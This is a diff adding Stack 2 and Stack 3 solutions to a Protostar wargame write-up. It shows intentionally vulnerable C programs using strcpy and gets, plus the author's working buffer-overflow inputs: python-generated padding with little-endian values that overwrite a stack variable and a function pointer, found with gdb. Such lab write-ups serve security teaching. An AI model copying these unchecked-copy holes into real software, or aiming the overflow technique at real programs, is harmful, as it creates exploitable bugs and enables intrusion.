@@ -752,7 +752,7 @@ you have changed the 'modified' variable
 
 Success.
 
-## Stack 1
+### Stack 1
 
 This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
 
@@ -816,4 +816,112 @@ you have correctly got the variable to the right value
 
 Success.
 
-## Stack 2
+### Stack 2
+
+Stack2 looks at environment variables, and how they can be set.
+
+This level is at /opt/protostar/bin/stack2
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+  char *variable;
+
+  variable = getenv("GREENIE");
+
+  if(variable == NULL) {
+      errx(1, "please set the GREENIE environment variable\n");
+  }
+
+  modified = 0;
+
+  strcpy(buffer, variable);
+
+  if(modified == 0x0d0a0d0a) {
+      printf("you have correctly modified the variable\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+
+}
+```
+
+This level is really stupid. You still have the `strcpy()` bug, and the `modified` variable has to be overwritten with `0x0d0a0d0a`.
+
+To solve this one, just `export GREENIE`. Its content will be copied into the buffer without paying attention to both the variable size and the buffer size.
+
+The buffer is still 64 bytes, and we can just put the hex into the script. We still have to pay attention to the order of the bytes, since Protostar is still little endian.
+
+```
+user@protostar:/opt/protostar/bin$ export GREENIE=`python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')"`
+user@protostar:/opt/protostar/bin$ ./stack2
+you have correctly modified the variable
+```
+
+Success.
+
+### Stack 3
+
+Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
+
+Hints
+- both gdb and objdump is your friend determining where the win() function lies in memory.
+
+This level is at /opt/protostar/bin/stack3
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  volatile int (*fp)();
+  char buffer[64];
+
+  fp = 0;
+
+  gets(buffer);
+
+  if(fp) {
+      printf("calling function pointer, jumping to 0x%08x\n", fp);
+      fp();
+  }
+}
+```
+
+This level is basically a dumb version of return address overwriting.
+
+The `gets()` function allows us to perform a buffer overflow.
+
+We have a function pointer `fp` adjacent to `buffer`. We just have to lookup where `win()` is located in memory with `gdb` and then put its address into `fp`:
+
+```
+user@protostar:/opt/protostar/bin$ gdb -q ./stack3
+Reading symbols from /opt/protostar/bin/stack3...done.
+(gdb) p win
+$1 = {void (void)} 0x8048424 <win>
+```
+
+So the `win()` function is located at `0x8048424`. Now we can use the script we used countless times, writing this address in little endian:
+
+```
+user@protostar:/opt/protostar/bin$ python -c "print('a'*64 + '\x24\x84\x04\x08')" | ./stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+```
+
+Success.
